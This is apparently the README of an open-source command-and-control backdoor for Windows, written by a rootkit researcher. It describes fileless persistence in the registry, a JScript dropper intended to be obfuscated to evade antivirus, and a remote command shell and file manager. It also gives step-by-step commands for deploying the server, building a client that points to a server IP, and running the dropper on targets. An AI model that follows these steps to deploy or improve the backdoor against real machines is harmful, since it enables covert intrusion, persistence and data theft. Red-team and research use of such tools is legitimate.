
# Micro Backdoor for Windows

Micro Backdoor is C2 tool for Windows targets with easy customizable code base and small footprint. Micro Backdoor consists from server, client and dropper. It wasn't designed as replacement for your favorite post-exploitation tools but rather as really minimalistic thing with all of the basic features in less than 5000 lines of code.  

I'm using Micro Backdoor mostly for demonstration purposes as payload for [my firmware rootkits](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot) and various low level persistence techniques. Its code was written in couple of nights, so, it might contain bugs and vulnerabilities: use it only for your own risk.

[General information](#general-information)  
[Web interface screenshots](#web-interface-screenshots)  
[Configuring the server](#configuring-the-server)  
[Deploying the server](#deploying-the-server)  
[Configuring the client](#configuring-the-client)  

## General information

Micro Backdoor client supports 32-bit and 64-bit versions of Windows XP, Vista, 7, 8, 8.1, 10, Server 2003, Server 2003 R2, Server 2008, Server 2008 R2, Server 2012, Server 2012 R2, Server 2016 and Server 2019 of any editions, languages and service packs.

Key features of the Micro Backdoor:

 * Client dropper is written in Microsoft JScript which makes it extremely convenient for obfuscation: once AV starts to detect the dropper you easily can modify its code or apply existing JScript obfuscation tools.

 * Client can detect SOCKS 4, SOCKS 5 or HTTP proxy server configuration in the system settings and connect to the server over this proxy.

 * In order to communicate with the server Micro Backdoor client is using end-to-end encrypted protocol with RSA authentication and random session key.

 * Client dropper is not creating any executable files on the disk: its body is stored inside Windows registry values which reduces backdoor footprint and makes it more stealth.

 * Backdoor server is written in Python and can be used on any operating system. It provides clean and simple web interface which allows to interact with connected clients in convenient way. [Redis database](https://redis.io/) is used to store clients state.

 * Backdoor server keeps track of all events for clients and server in the log files.

 * For each connected client Micro Backdoor provides semi-interactive command shell running in the web browser.

 * Micro Backdoor has convenient file manager which allows to browse client file system, download and upload the files.

 * Backdoor server is also providing Python API and command line interface to perform any actions with connected clients which is useful for automation and scripting.


## Web interface screenshots

Main web interface page with connected clients list:

<img src="https://raw.githubusercontent.com/Cr4sh/MicroBackdoor/master/docs/images/web_main.png" width="885">
  

Command shell page:

<img src="https://raw.githubusercontent.com/Cr4sh/MicroBackdoor/master/docs/images/web_shell.png" width="889">
  
  
File manager page:

<img src="https://raw.githubusercontent.com/Cr4sh/MicroBackdoor/master/docs/images/web_files.png" width="885">


## Configuring the server

Micro Backdoor server code is located in `./server` directory, you have to upload its contents to the remote machine where you planning to run the server.  

Directory contents:

 * `server.py` &minus; Server executable file
 * `config.py` &minus; Server configuration file
 * `access.log` &minus; Access log of embedded web server used for admin interface
 * `server.log` &minus; Server log file with messages related to connected clients
 * `server.pgid` &minus; Text file with PGID of the running server
 * `server.crt` &minus; Server RSA certificate used to encrypt client communication
 * `server.key` &minus; Server RSA private key, see above
 * `downloads/` &minus; Directory to store files downloaded from the clients
 * `logs/` &minus; Directory with individual command line history files for each client
 * `static/` &minus; Directory with static files needed for admin interface

Python program `server.py` has a lot of command line options used to configure and manage the server, interact with connected clients, etc. Here’s how to get to get the server running:

1) Install needed dependencies:

```
$ sudo apt-get install python-dev python-setuptools
$ sudo pip install m2crypto pycrypto redis cherrypy
```

2) Install and run Redis database server:

```
$ sudo apt-get install redis-server
$ sudo service redis-server start
```

3) Edit `config.py` file and change default values of `HTTP_USERS` and `HTTP_PATH` to secure your server installation.

4) Generate RSA key pair for new installation of the server, it will create `server.crt` and `server.key` files:

```
$ ./server.py --keys
```

5) Run the server as background process:

```     
$ ./server.py --daemon
```

6) Shutdown the server:

```
$ ./server.py --shutdown
```

Alternatively, you can run `server.py` with no command line options specified to start the server as interactive shell process (useful for debugging). After the server was started you can open admin interface in the web browser, its URL is composed from `HTTP_ADDR`, `HTTP_PORT` and `HTTP_PATH` options of `config.py` configuration file.  

Also, there’s some options to interact with connected clients from the command line.  

Retrieve and print list of the currently connected clients:

```
$ ./server.py --list
```

Execute some command on the connected client:

```
$ ./server.py --client <target_ID> --exec <command>
```

Upload some file to the connected client:

```
$ ./server.py --client <target_ID> --fput <remote_path> --file <local_path>
```

Download some file from the connected client:

```
$ ./server.py --client <target_ID> --fget <remote_path> --file <local_path>
```

Update Micro Backdoor on the client:

```     
$ ./server.py --client <target_ID> --update <dropper_path>
```


## Deploying the server

For easy deployment of Micro Backdoor server there's [Fabric](https://www.fabfile.org/) scenario located in `fabfile.py` Python script. To deploy the server to the remote Linux host you have to perform the following steps.

1) Edit `.ssh_config` file located in the project directory and add your server information there, for example:

```
Host my-server
     HostName my-server.net
     Port 22
     User user
     IdentityFile ~/.ssh/id_rsa
```

2) Run `./server.py --keys` on your local machine in order to generate RSA key pair.

3) Run `fab deps:host=my-server` command to connect to the remote host `my-server` over the SSH and install needed dependencies.

4) Run `fab deploy:host=my-server` command to copy needed files to the remote host `my-server` and run the server.

5) You also can run `fab stop` to stop running server, `fab start` to start it and `fab uninstall` to shutdown and remove its files form the remote host.


# Configuring the client

Micro Backdoor client consists from the binary part used to implement backdoor functionality and JScript wrapper combined with the shellcode used to run and deliver the binary part in file-less way.  

⚠️ **JScript and PowerShell code used in client dropper is easily detectable by most of AV/EDR products, you should consider to modify it [or use other methods](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot) to deliver the binary part of the client**  

First, you have to configure the binary using `./client_builder.py` command line program, it operates with default configuration specified in `./server/config.py` file mentioned in previous part of the document:

```
$ ./client_builder.py client.dll [server_IP]
```

Also, you can specify `client_amd64.dll` file to use x86_64 version of the client, or `client_debug.dll`/`client_amd64_debug.dll` to use debug build of the client that prints diagnostic messages into the standard Windows debug output. Before running `client_builder.py` you need to generate RSA key pair, see [Configuring the server](#configuring-the-server) section of this document.  

You can use configured client binary with your own delivery tool: exploit, reflective loader, etc. Or you can generate JScript client dropper:

```
$ ./client_encoder.py dll_inject_script client.dll > dropper.js
```

After the `dropper.js` was generated you can deploy it on your targets. In Windows command line you can run JScript files by running `cscript.exe dropper.js`. Or you can just double click JS file in Windows Explorer to run the dropper. Micro Backdoor client provides persistence within current user account used to run the dropper, it can work with any privileges and medium integrity level.

## Developed by

Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com<br/>
http://blog.cr4.sh<br/>
[@d_olex](http://twitter.com/d_olex)<br/>


